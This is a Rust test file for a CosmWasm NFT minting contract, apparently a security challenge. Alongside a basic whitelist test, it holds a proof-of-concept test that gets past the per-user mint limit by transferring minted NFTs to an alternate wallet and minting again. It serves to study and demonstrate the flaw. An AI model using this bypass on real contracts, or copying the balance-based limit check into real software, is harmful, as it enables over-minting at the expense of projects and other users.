#[cfg(test)]
pub mod tests {
    use crate::{
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::{Config, Whitelist},
    };
    use cosmwasm_std::{Addr, Empty};

    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_code() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        )
        .with_reply(crate::contract::reply);
        Box::new(contract)
    }

    fn cw721_code() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            cw721_base::entry::execute,
            cw721_base::entry::instantiate,
            cw721_base::entry::query,
        );
        Box::new(contract)
    }

    pub const ADMIN: &str = "admin";
    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const USER3: &str = "user3";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let challenge_id = app.store_code(challenge_code());
        let cw_721_id = app.store_code(cw721_code());

        // Init challenge
        let challenge_inst = InstantiateMsg {
            cw721_code_id: cw_721_id,
            mint_per_user: 3,
            whitelisted_users: vec![USER1.to_owned(), USER2.to_owned(), USER3.to_owned()],
        };

        let contract_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        // query config
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        // query whitelisted users
        let whitelist: Whitelist = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
            .unwrap();

        assert!(whitelist.users.contains(&USER1.to_owned()));
        assert!(whitelist.users.contains(&USER2.to_owned()));
        assert!(whitelist.users.contains(&USER3.to_owned()));

        let user4 = "user4";

        // mint to non-whitelisted user
        app.execute_contract(
            Addr::unchecked(user4),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // mint to whitelisted user until max limit
        assert_eq!(config.mint_per_user, 3);

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // exceed max limit fails
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // other users can mint freely
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // ensure total tokens increases
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        assert_eq!(config.total_tokens, 4);
    }

    const USER1_ALT_WALLET: &str = "user1_alt_wallet";

    // We will show how USER1 can bypass the mint limit
    #[test]
    fn exploit_mint_query_flaw() {
        // base setup with mint limit 3 and USER1 whitelisted
        let (mut app, contract_addr) = proper_instantiate();
        // mint 3 NFTs to USER1
        for _ in 0..3 {
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            )
            .unwrap();
        }

        let Config {
            nft_contract,
            mint_per_user,
            total_tokens,
        } = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(mint_per_user, 3);
        assert_eq!(total_tokens, 3);

        // Query USER1's balance 
        let tokens: cw721::TokensResponse = app
            .wrap()
            .query_wasm_smart(
                nft_contract.clone(),
                &cw721::Cw721QueryMsg::Tokens {
                    owner: USER1.to_string(),
                    start_after: None,
                    limit: None,
                },
            )
            .unwrap();
        assert_eq!(tokens.tokens.len(), 3);

        // User can transfer the 3 NFTs minted to another wallet
        for token in tokens.tokens {
            app.execute_contract(
                Addr::unchecked(USER1),
                nft_contract.clone(),
                &cw721::Cw721ExecuteMsg::TransferNft {
                    recipient: USER1_ALT_WALLET.to_string(),
                    token_id: token,
                },
                &[],
            )
            .unwrap();
        }
        // USER1 now can mint even more  
        for _ in 0..3 {
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            )
            .unwrap();
        }
        let Config {
            total_tokens,
            ..
        } = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        // USER1 has now minted 6 NFTs in total
        assert_eq!(total_tokens, 6); 
    }
}
